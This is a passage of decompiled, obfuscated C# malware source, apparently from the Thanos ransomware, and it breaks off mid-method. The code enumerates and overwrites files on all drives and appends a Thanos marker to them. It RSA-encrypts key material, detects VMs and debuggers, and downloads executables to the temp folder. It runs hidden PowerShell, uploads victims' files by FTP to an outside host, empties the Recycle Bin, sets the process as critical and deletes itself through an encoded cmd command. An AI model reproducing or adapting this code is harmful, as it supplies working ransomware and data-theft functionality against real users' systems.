using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;
using ns2;
using ns3;
using ns4;

namespace ns1;

internal class Class32
{
	static bool smethod_0(string string_0)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	static int smethod_1(int int_0)
	{
		if (Class16.bool_0)
		{
			return (int_0 - 384) / 8 + 7;
		}
		return (int_0 - 384) / 8 + 37;
	}

	static byte[] smethod_2(int int_0, byte[] byte_0, string string_0)
	{
		if (byte_0 != null && byte_0.Length != 0)
		{
			int num = Class32.smethod_1(int_0);
			if (byte_0.Length > num)
			{
				throw new ArgumentException($"Maximum data length is {num}", "data");
			}
			if (!Class32.smethod_32(int_0))
			{
				throw new ArgumentException("Key size is not valid", "keySize");
			}
			if (string.IsNullOrEmpty(string_0))
			{
				throw new ArgumentException("Key is null or empty", "publicKeyXml");
			}
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(int_0);
			rSACryptoServiceProvider.FromXmlString(string_0);
			return rSACryptoServiceProvider.Encrypt(byte_0, Class16.bool_0);
		}
		throw new ArgumentException("Data are empty", "data");
	}

	static int smethod_3(Class24.Class26 class26_0, int int_0)
	{
		if (class26_0.int_2 < int_0)
		{
			if (class26_0.int_0 == class26_0.int_1)
			{
				return -1;
			}
			class26_0.uint_0 |= (uint)(((class26_0.byte_0[class26_0.int_0++] & 0xFF) | ((class26_0.byte_0[class26_0.int_0++] & 0xFF) << 8)) << class26_0.int_2);
			class26_0.int_2 += 16;
		}
		return (int)(class26_0.uint_0 & ((1 << int_0) - 1));
	}

	static int smethod_4(Class24.Class26 class26_0)
	{
		return class26_0.int_2;
	}

	[DllImport("Shell32.dll", CharSet = CharSet.Unicode)]
	static extern uint SHEmptyRecycleBin(IntPtr intptr_0, string string_0, Class15.Enum0 enum0_0);

	static int smethod_5(Class24.Class26 class26_0)
	{
		return class26_0.int_1 - class26_0.int_0 + (class26_0.int_2 >> 3);
	}

	static byte[] smethod_6(string string_0, int int_0)
	{
		FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
		byte[] array = new byte[int_0];
		fileStream.Read(array, 0, int_0);
		fileStream.Close();
		fileStream.Dispose();
		return array;
	}

	static bool smethod_7()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item("Manufacturer").ToString()!.ToLower();
							if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	unsafe static int smethod_8(int int_0, int int_1, byte[] byte_0, Class24.Class25 class25_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class25_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class32.smethod_69(byte_0, int_0, int_1, class25_0.class27_0);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class32.smethod_47(class25_0) || (class25_0.class27_0.int_1 > 0 && class25_0.int_4 != 11));
		return *(int*)ptr;
	}

	static Class24.Class28 smethod_9(Class24.Class29 class29_0)
	{
		byte[] array = new byte[class29_0.int_3];
		Array.Copy(class29_0.byte_1, 0, array, 0, class29_0.int_3);
		return new Class24.Class28(array);
	}

	static string smethod_10(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static List<string> smethod_11()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	static void smethod_12(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	unsafe static void smethod_13(string string_0, string string_1, string string_2)
	{
		void* ptr = stackalloc byte[16];
		UdpClient udpClient = new UdpClient();
		byte[] array = new byte[102];
		*(int*)ptr = 0;
		while (*(int*)ptr <= 5)
		{
			array[*(int*)ptr] = byte.MaxValue;
			(*(int*)ptr)++;
		}
		string[] array2 = null;
		array2 = ((!string_0.Contains("-")) ? string_0.Split(new char[1] { ':' }) : string_0.Split(new char[1] { '-' }));
		if (array2.Length != 6)
		{
			throw new ArgumentException("Incorrect MAC address supplied!");
		}
		*(int*)((byte*)ptr + 4) = 6;
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 16)
		{
			*(int*)((byte*)ptr + 12) = 0;
			while (*(int*)((byte*)ptr + 12) < 6)
			{
				array[*(int*)((byte*)ptr + 4) + *(int*)((byte*)ptr + 8) * 6 + *(int*)((byte*)ptr + 12)] = (byte)Convert.ToInt32(array2[*(int*)((byte*)ptr + 12)], 16);
				(*(int*)((byte*)ptr + 12))++;
			}
			(*(int*)((byte*)ptr + 8))++;
		}
		IPAddress ipaddress_ = IPAddress.Parse(string_1);
		IPAddress ipaddress_2 = IPAddress.Parse(string_2);
		IPAddress iPAddress = ipaddress_.smethod_0(ipaddress_2);
		udpClient.Send(array, array.Length, iPAddress.ToString(), 3);
	}

	unsafe static void smethod_14(byte[] byte_0, Class24.Class28 class28_0)
	{
		void* ptr = stackalloc byte[64];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 16) = byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				array[*(int*)((byte*)ptr + 16)]++;
			}
			(*(int*)((byte*)ptr + 12))++;
		}
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 512;
		*(int*)((byte*)ptr + 20) = 1;
		while (*(int*)((byte*)ptr + 20) <= 15)
		{
			array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
			*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
			if (*(int*)((byte*)ptr + 20) >= 10)
			{
				*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
				*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
				*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
			}
			(*(int*)((byte*)ptr + 20))++;
		}
		class28_0.short_0 = new short[*(int*)((byte*)ptr + 4)];
		*(int*)((byte*)ptr + 8) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
			*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
			while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
			{
				class28_0.short_0[Class32.smethod_65(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 40) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 44) = 0;
		while (*(int*)((byte*)ptr + 44) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 48) = byte_0[*(int*)((byte*)ptr + 44)];
			if (*(int*)((byte*)ptr + 48) != 0)
			{
				*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
				*(int*)((byte*)ptr + 52) = Class32.smethod_65(*(int*)ptr);
				if (*(int*)((byte*)ptr + 48) <= 9)
				{
					do
					{
						class28_0.short_0[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 56) = class28_0.short_0[*(int*)((byte*)ptr + 52) & 0x1FF];
					*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
					*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
					do
					{
						class28_0.short_0[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
				}
				array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
			}
			(*(int*)((byte*)ptr + 44))++;
		}
	}

	static List<Class18> smethod_15()
	{
		try
		{
			List<Class18> list = new List<Class18>();
			string[] array = Class32.smethod_61().Split('\n', '\r');
			foreach (string text in array)
			{
				if (!string.IsNullOrEmpty(text))
				{
					string[] source = text.Split(' ', '\t');
					if (Class18.func_0 == null)
					{
						Class18.func_0 = Class18.smethod_0;
					}
					string[] array2 = source.Where(Class18.func_0).ToArray();
					if (array2.Length == 3)
					{
						list.Add(new Class18(array2[1], array2[0]));
					}
				}
			}
			return list;
		}
		catch (Exception innerException)
		{
			throw new Exception("IPInfo: Error Parsing 'arp -a' results", innerException);
		}
	}

	[DllImport("kernel32.dll")]
	static extern IntPtr GetCurrentProcess();

	static void smethod_16()
	{
		try
		{
			Class32.SHEmptyRecycleBin(IntPtr.Zero, (string)null, (Class15.Enum0)5);
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll")]
	static extern IntPtr GetModuleHandle(string string_0);

	static void smethod_17(byte[] byte_0, string string_0)
	{
		FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
		fileStream.Write(byte_0, 0, byte_0.Length);
		fileStream.Close();
		fileStream.Dispose();
		byte[] bytes = Encoding.ASCII.GetBytes("Thanos-" + Convert.ToString(Class0.string_23) + "-");
		using FileStream fileStream2 = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream2.Write(bytes, 0, bytes.Length);
	}

	static string smethod_18(string string_0)
	{
		int int_ = 0;
		string string_ = "";
		Class32.smethod_22(ref int_, Class16.string_0, out string_);
		byte[] inArray = Class32.smethod_2(int_, Encoding.UTF8.GetBytes(string_0), string_);
		return Convert.ToBase64String(inArray);
	}

	static RawSecurityDescriptor smethod_19(IntPtr intptr_0, Class12 class12_0)
	{
		byte[] byte_ = new byte[0];
		Class32.GetKernelObjectSecurity(intptr_0, 4, byte_, 0u, out uint uint_);
		if ((long)uint_ > 32767L)
		{
			throw new Win32Exception();
		}
		if (!Class32.GetKernelObjectSecurity(intptr_0, 4, byte_ = new byte[uint_], uint_, out uint_))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(byte_, 0);
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	static extern bool GetKernelObjectSecurity(IntPtr intptr_0, int int_0, [Out] byte[] byte_0, uint uint_0, out uint uint_1);

	unsafe static void smethod_20(string string_0)
	{
		void* ptr = stackalloc byte[8];
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			FileInfo[] files = directoryInfo.GetFiles();
			*(int*)ptr = 0;
			while (*(int*)ptr < files.Length)
			{
				FileInfo fileInfo = files[*(int*)ptr];
				try
				{
					Class5.list_0.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
				(*(int*)ptr)++;
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < directories.Length)
			{
				DirectoryInfo directoryInfo2 = directories[*(int*)((byte*)ptr + 4)];
				try
				{
					Class32.smethod_20(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
				(*(int*)((byte*)ptr + 4))++;
			}
		}
		catch
		{
		}
		if (Class5.list_0.Count <= 0)
		{
			return;
		}
		List<string> list_ = Class5.list_0;
		if (Class5.func_0 == null)
		{
			Class5.func_0 = Class5.smethod_1;
		}
		foreach (string item in list_.Where(Class5.func_0))
		{
			Class5.list_1.Add(item);
		}
		Class5.list_0.Clear();
		if (Class5.list_1.Count <= 0)
		{
			return;
		}
		List<string> list_2 = Class5.list_1;
		if (Class5.func_1 == null)
		{
			Class5.func_1 = Class5.smethod_2;
		}
		foreach (FileInfo item2 in list_2.Select(Class5.func_1))
		{
			Class5.smethod_0(item2.Name);
		}
	}

	static bool smethod_21(Class24.Class26 class26_0)
	{
		return class26_0.int_0 == class26_0.int_1;
	}

	static void smethod_22(ref int int_0, [Out] string string_0, out string string_1)
	{
		int_0 = 0;
		string_1 = "";
		if (string_0 == null || string_0.Length <= 0)
		{
			return;
		}
		byte[] bytes = Convert.FromBase64String(string_0);
		string @string = Encoding.UTF8.GetString(bytes);
		if (@string.Contains("!"))
		{
			string[] array = @string.Split(new char[1] { '!' }, 2);
			try
			{
				int_0 = int.Parse(array[0]);
				string_1 = array[1];
			}
			catch (Exception)
			{
			}
		}
	}

	static void smethod_23()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					Class32.smethod_20(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	static int smethod_24(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	unsafe static bool smethod_25()
	{
		void* ptr = stackalloc byte[2];
		*(sbyte*)ptr = 0;
		try
		{
			Class32.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref *(bool*)ptr);
			((byte*)ptr)[1] = *(byte*)ptr;
		}
		catch
		{
			((byte*)ptr)[1] = *(byte*)ptr;
		}
		return ((byte*)ptr)[1] != 0;
	}

	static void smethod_26(object sender, SessionEndingEventArgs e)
	{
		if (Class32.smethod_27())
		{
			Class32.smethod_75();
		}
	}

	static bool smethod_27()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	static void smethod_28(Uri uri_0)
	{
		try
		{
			Stream stream = null;
			stream = new WebClient().OpenRead(uri_0.ToString());
			Image val = Image.FromStream(stream);
			string text = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
			val.Save(text, ImageFormat.get_Bmp());
			Class32.SystemParametersInfo(20, 0, text, 3);
			Thread.Sleep(5000);
		}
		catch (Exception)
		{
		}
	}

	static int smethod_29(Class24.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	unsafe static bool smethod_30(Class24.Class25 class25_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class32.smethod_33(class25_0.class27_0);
		while (num >= 258)
		{
			*(int*)ptr = class25_0.int_4;
			switch (*(int*)ptr)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class32.smethod_48(class25_0.class28_0, class25_0.class26_0)) & -256) == 0)
				{
					Class32.smethod_39(class25_0.class27_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class25_0.int_6 = Class24.Class25.int_0[num2 - 257];
					class25_0.int_5 = Class24.Class25.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class25_0.class28_1 = null;
				class25_0.class28_0 = null;
				class25_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class25_0.int_5 > 0)
				{
					class25_0.int_4 = 8;
					*(int*)((byte*)ptr + 4) = Class32.smethod_3(class25_0.class26_0, class25_0.int_5);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class32.smethod_74(class25_0.class26_0, class25_0.int_5);
					class25_0.int_6 += *(int*)((byte*)ptr + 4);
				}
				class25_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class32.smethod_48(class25_0.class28_1, class25_0.class26_0);
				if (num2 >= 0)
				{
					class25_0.int_7 = Class24.Class25.int_2[num2];
					class25_0.int_5 = Class24.Class25.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class25_0.int_5 > 0)
				{
					class25_0.int_4 = 10;
					*(int*)((byte*)ptr + 8) = Class32.smethod_3(class25_0.class26_0, class25_0.int_5);
					if (*(int*)((byte*)ptr + 8) < 0)
					{
						return false;
					}
					Class32.smethod_74(class25_0.class26_0, class25_0.int_5);
					class25_0.int_7 += *(int*)((byte*)ptr + 8);
				}
				Class32.smethod_42(class25_0.class27_0, class25_0.int_6, class25_0.int_7);
				num -= class25_0.int_6;
				class25_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static Class24.Class28 smethod_31(Class24.Class29 class29_0)
	{
		byte[] array = new byte[class29_0.int_4];
		Array.Copy(class29_0.byte_1, class29_0.int_3, array, 0, class29_0.int_4);
		return new Class24.Class28(array);
	}

	static bool smethod_32(int int_0)
	{
		if (int_0 >= 384 && int_0 <= 16384)
		{
			return int_0 % 8 == 0;
		}
		return false;
	}

	static int smethod_33(Class24.Class27 class27_0)
	{
		return 32768 - class27_0.int_1;
	}

	static void smethod_34(string string_0)
	{
		using Mutex mutex = new Mutex(initiallyOwned: false, "Global\\" + string_0);
		if (!mutex.WaitOne(0, exitContext: false))
		{
			Process.GetCurrentProcess().Kill();
		}
	}

	static void smethod_35(RawSecurityDescriptor rawSecurityDescriptor_0, Class12 class12_0, IntPtr intptr_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!Class32.SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	static void smethod_36(Class24.Class27 class27_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class27_0.byte_0[class27_0.int_0++] = class27_0.byte_0[int_0++];
			class27_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static int smethod_37(Class24.Class27 class27_0)
	{
		return class27_0.int_1;
	}

	static void smethod_38(int int_0, int int_1, byte[] byte_0, Class24.Class26 class26_0)
	{
		if (class26_0.int_0 < class26_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class26_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class26_0.int_2);
				class26_0.int_2 += 8;
			}
			class26_0.byte_0 = byte_0;
			class26_0.int_0 = int_0;
			class26_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static void smethod_39(Class24.Class27 class27_0, int int_0)
	{
		if (class27_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class27_0.byte_0[class27_0.int_0++] = (byte)int_0;
		class27_0.int_0 &= 32767;
	}

	unsafe static byte[] smethod_40(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class32.smethod_70(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class24.Stream0 stream = new Class24.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class32.smethod_78(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class32.smethod_29(stream);
			*(int*)((byte*)ptr + 4) = Class32.smethod_29(stream);
			*(int*)((byte*)ptr + 8) = Class32.smethod_29(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class32.smethod_78(stream);
			Class32.smethod_78(stream);
			Class32.smethod_78(stream);
			*(int*)((byte*)ptr + 12) = Class32.smethod_78(stream);
			*(int*)((byte*)ptr + 16) = Class32.smethod_29(stream);
			*(int*)((byte*)ptr + 20) = Class32.smethod_29(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class24.Class25 @class = new Class24.Class25(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class24.Class25 class25_ = @class;
			byte[] byte_ = array;
			*(int*)((byte*)ptr + 40) = array.Length;
			Class32.smethod_8(*(int*)((byte*)ptr + 40), 0, byte_, class25_);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class32.smethod_78(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					int num = Class32.smethod_78(stream);
					*(int*)((byte*)ptr + 36) = Class32.smethod_78(stream);
					byte[] array3 = new byte[num];
					stream.Read(array3, 0, array3.Length);
					Class32.smethod_8(*(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 32), array, new Class24.Class25(array3));
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 36);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_2 = new byte[8] { 181, 58, 108, 190, 4, 210, 15, 191 };
				byte[] byte_3 = new byte[8] { 170, 177, 146, 183, 247, 57, 120, 61 };
				using ICryptoTransform cryptoTransform = Class32.smethod_60(byte_3, bool_0: true, byte_2);
				array = Class32.smethod_40(cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class32.smethod_51(bool_0: true, byte_4, byte_5);
				array = Class32.smethod_40(cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static string smethod_41(int int_0)
	{
		void* ptr = stackalloc byte[8];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		*(int*)ptr = int_0 * 6;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 7) / 8;
		byte[] array = new byte[*(int*)((byte*)ptr + 4)];
		rNGCryptoServiceProvider.GetBytes(array);
		return Convert.ToBase64String(array);
	}

	static void smethod_42(Class24.Class27 class27_0, int int_0, int int_1)
	{
		if ((class27_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class27_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class27_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class27_0.byte_0, num, class27_0.byte_0, class27_0.int_0, int_0);
				class27_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class27_0.byte_0[class27_0.int_0++] = class27_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class32.smethod_36(class27_0, num, int_0, int_1);
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	static extern void RtlSetProcessIsCritical(uint uint_0, uint uint_1, uint uint_2);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern int SystemParametersInfo(int int_0, int int_1, string string_0, int int_2);

	static void smethod_43()
	{
		string text = Class32.smethod_44("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	static extern bool SetKernelObjectSecurity(IntPtr intptr_0, int int_0, [In] byte[] byte_0);

	static string smethod_44(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	static string smethod_45(string string_0, string string_1)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_1, string_0);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}

	static void smethod_46(string string_0 = "ftp://files.000webhost.com/public_html/", string string_1 = "FTP UserName", string string_2 = "ACCESS", string string_3 = "")
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Credentials = new NetworkCredential(string_0, string_3);
			webClient.UploadFile(string_1 + string.Format("UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + Path.GetFileName(string_2)), "STOR", string_2);
		}
		catch
		{
		}
	}

	unsafe static bool smethod_47(Class24.Class25 class25_0)
	{
		void* ptr = stackalloc byte[8];
		switch (class25_0.int_4)
		{
		case 2:
			if (class25_0.bool_0)
			{
				class25_0.int_4 = 12;
				return false;
			}
			*(int*)ptr = Class32.smethod_3(class25_0.class26_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class32.smethod_74(class25_0.class26_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class25_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class32.smethod_53(class25_0.class26_0);
				class25_0.int_4 = 3;
				break;
			case 1:
				class25_0.class28_0 = Class24.Class28.class28_0;
				class25_0.class28_1 = Class24.Class28.class28_1;
				class25_0.int_4 = 7;
				break;
			case 2:
				class25_0.class29_0 = new Class24.Class29();
				class25_0.int_4 = 6;
				break;
			}
			return true;
		case 3:
			if ((class25_0.int_8 = Class32.smethod_3(class25_0.class26_0, 16)) < 0)
			{
				return false;
			}
			Class32.smethod_74(class25_0.class26_0, 16);
			class25_0.int_4 = 4;
			goto case 4;
		case 4:
			if (Class32.smethod_3(class25_0.class26_0, 16) < 0)
			{
